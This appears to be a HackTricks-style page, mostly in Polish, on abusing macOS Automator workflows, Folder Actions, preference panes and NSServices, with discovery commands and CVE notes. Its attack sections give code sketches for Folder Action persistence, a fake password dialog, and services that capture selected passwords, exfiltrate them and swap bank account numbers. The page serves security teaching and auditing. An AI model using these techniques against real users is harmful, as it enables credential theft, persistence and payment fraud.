# Abuse of macOS Automator, Preference Panes & NSServices

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** to wizualne narzędzie macOS do automatyzacji. Wykonuje **workflows** (bundle `.workflow`) złożone z **actions** (bundle `.action`). Automator obsługuje również integrację z **Folder Actions**, **Quick Actions** i **Shortcuts**. We współczesnym macOS workflows można także **importować do Shortcuts**, dlatego ta sama złośliwa logika może pojawić się jako Finder Quick Action, user service w `~/Library/Services/` lub shortcut korzystający ze starszych Automator actions.

Automator actions to **plugins** ładowane do środowiska uruchomieniowego Automator podczas wykonywania workflow. Mogą:
- Wykonywać dowolne shell scripts
- Przetwarzać pliki i dane
- Komunikować się z aplikacjami za pomocą AppleScript
- Łączyć się w celu tworzenia złożonej automatyzacji

### Dlaczego ma to znaczenie

> [!WARNING]
> Automator workflows można nakłonić do wykonania za pomocą **social engineering** — wyglądają jak zwykłe pliki dokumentów. Bundle `.workflow` może zawierać osadzone polecenia shell, które są wykonywane podczas uruchamiania workflow. W połączeniu z Folder Actions zapewniają **automatyczną persistence** uruchamianą przez zdarzenia związane z plikami. Ostatnie poprawki w Gatekeeper pokazały również, że **Quick Actions znajdujące się w app bundle** (`Contents/PlugIns/*.workflow`) należy traktować jako wykonywalną zawartość, a nie nieszkodliwe dane.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Workflow oparty na inżynierii społecznej

Pakiet `.workflow` wygląda dla większości użytkowników jak zwykły plik dokumentu:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions automatycznie wykonują workflow, gdy pliki zostaną dodane do monitorowanego folderu:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions utrzymują się po ponownym uruchomieniu systemu i wykonują się bezgłośnie. Folder Action dla `~/Downloads` oznacza, że **każdy pobrany plik uruchamia Twój payload** — w tym pliki z Safari, Chrome, AirDrop oraz załączniki wiadomości e-mail. Należy również pamiętać, że `System Events` może rejestrować Folder Actions wskazujące na skrypty spoza domyślnych lokalizacji `~/Library/Scripts/Folder Action Scripts`, dlatego warto wyszukiwać również luźne ścieżki. Informacje o powiązanych implikacjach TCC znajdziesz na [stronie TCC](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Podstawowe informacje

Preference panes (bundle `.prefPane`) to pluginy ładowane przez **System Settings** (wcześniej System Preferences). Udostępniają panele interfejsu konfiguracji dla funkcji systemowych lub innych firm. W starszych systemach były ładowane bezpośrednio przez `System Preferences`; w nowszych wydaniach panele innych firm są zwykle obsługiwane przez **legacy loader XPC service** uruchamiany z poziomu System Settings.

### Dlaczego ma to znaczenie

- Preference panes wykonują się w **zaufanym procesie hosta** uruchamianym przez System Settings / System Preferences
- We współczesnych systemach hostem może być **`legacyLoader` XPC service**, więc najważniejsza granica nadal przebiega między **zaufanym procesem interfejsu Apple a ładowaniem kodu innej firmy**
- Preference panes innych firm dziedziczą **kontekst bezpieczeństwa procesu hosta** oraz zaufanie użytkownika powiązane z tym interfejsem
- Użytkownicy instalują preference panes, **klikając je dwukrotnie** — to ułatwia inżynierię społeczną
- Po zainstalowaniu **utrzymują się** i są ładowane za każdym razem, gdy System Settings otwiera dany panel

### Wykrywanie
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Atak: Przejęcie kontekstu uprawnień

Złośliwy panel preferencji dziedziczy kontekst bezpieczeństwa **hosta panelu** (historycznie `System Preferences`, a w nowszych wersjach często pomocniczy `legacyLoader` uruchamiany przez `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Atak: Persistence via Installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

A preference pane can mimic legitimate system UI panels to **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Podstawowe informacje

**NSServices** umożliwiają aplikacjom udostępnianie funkcji innym aplikacjom za pośrednictwem **menu Services** (kliknięcie prawym przyciskiem myszy → Services). Gdy użytkownik zaznaczy tekst lub dane i wywoła usługę, zaznaczone dane są **wysyłane do dostawcy usługi** w celu przetworzenia.

Usługi są deklarowane w `Info.plist` aplikacji pod kluczem `NSServices` i rejestrowane na serwerze pasteboard (`pbs`). macOS przechowuje również **cache usług** oraz **politykę ograniczeń**, które decydują o tym, które usługi są widoczne i czy aplikacje działające w sandboxie powinny otrzymać dodatkowe ostrzeżenie.

### Dlaczego ma to znaczenie

- Usługi otrzymują **dane przepływające między aplikacjami** — zaznaczony tekst z dowolnej aplikacji jest wysyłany do usługi
- Złośliwa usługa przechwytuje dane z menedżerów haseł, klientów poczty e-mail i aplikacji finansowych
- Usługi mogą **zwracać zmodyfikowane dane** do wywołującej aplikacji (man-in-the-middle w operacjach na zaznaczeniu)
- Nazwy usług mogą być skonstruowane tak, aby wyglądały wiarygodnie („Formatuj tekst”, „Szyfruj zaznaczenie”, „Udostępnij”)
- Opcjonalna flaga `NSRestricted` ma znaczenie dla bezpieczeństwa: usługa oznaczona jako unrestricted może być wywoływana przez aplikację działającą w sandboxie bez ostrzeżenia wyświetlanego przez macOS w przypadku usług podatnych na escape<sup>[[2]](#references)</sup>

### Wykrywanie
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Atak: Usługa przechwytywania danych
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Atak: Modyfikacja danych (Man-in-the-Middle)

Usługa może **modyfikować zwracane dane**, jednocześnie sprawiając wrażenie, że zapewnia prawidłowe działanie:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

Apple obsługuje opcjonalną wartość boolean `NSRestricted` dla każdej definicji usługi. Jeśli jest ustawiona, macOS ostrzega sandboxed callers, ponieważ usługa może pomóc im **escape sandbox or privacy boundaries**. Z perspektywy offensive daje to dwie użyteczne ścieżki audytu:

- Szukaj **third-party services not marked as restricted**, mimo że pośredniczą w Apple Events, dostępie do plików lub innych uprzywilejowanych działaniach
- Szukaj **high-value built-in services** z silnymi entitlements (na przykład usług udostępnianych przez Script Editor lub helpery oparte na Finderze) i sprawdzaj, czy interakcja z użytkownikiem wystarcza, aby przekształcić je w primitive dostępu do danych

Dobrym niedawnym przykładem jest **CVE-2022-48574**, w którym mechanizm Services mógł zostać wykorzystany do uzyskania dostępu do **TCC-protected user files bez oczekiwanego confirmation flow**. Błąd został naprawiony, ale technika pozostaje użyteczna w threat modeling: każda usługa, która przekazuje żądania dostępu do plików lub automatyzacji w imieniu caller, zasługuje na taką samą analizę.<sup>[[2]](#references)</sup>

---

## Recent Security Notes

- **Quick Actions are executable content**: Apple naprawiło w 2024 roku Gatekeeper bypass, w którym Quick Action Automatora dołączona do app bundle mogła zostać uruchomiona bez standardowego assessment. Podczas audytowania aplikacji sprawdzaj `Contents/PlugIns/*.workflow/Contents/document.wflow` dokładnie tak, jak sprawdzałbyś helper scripts lub login items. Zobacz [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
- **Shortcuts can inherit legacy Automator behavior**: Apple dodało również dodatkowy user-consent prompt po wykryciu, że third-party shortcuts używały **legacy Automator action** do wysyłania Apple Events bez oczekiwanego permission flow. Zaimportowane workflows i shortcut bundles powinny być sprawdzane pod kątem `Run AppleScript`, `Run Shell Script` oraz podobnych bridge actions. Zobacz [the TCC page](../macos-security-protections/macos-tcc/README.md).<sup>[[3]](#references)</sup>
- **Automator is still a live privacy boundary**: Apple dostarczyło kolejną poprawkę Automatora w 2025 roku dotyczącą dostępu do chronionych danych użytkownika. Nawet jeśli Automator jest legacy surface, traktuj każdy workflow runner, Quick Action host lub automation bridge jako aktualną attack surface, a nie dead code.<sup>[[4]](#references)</sup>

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Panel preferencji → eskalacja TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Kradzież z Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Referencje

- [1] [Apple — Informacje o zawartości zabezpieczeń systemów macOS Ventura 13.7, Sonoma 14.7 i Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Jak działał exploit NSServices w systemie macOS](https://moonlock.com/nsservices-macos)
- [3] [Apple — Informacje o zawartości zabezpieczeń systemu macOS Sonoma 14.6 (CVE-2024-40834)](https://support.apple.com/en-us/120911)
- [4] [Apple — Informacje o zawartości zabezpieczeń systemu macOS Sequoia 15.4 (CVE-2025-30460)](https://support.apple.com/en-us/122373)

{{#include ../../../banners/hacktricks-training.md}}
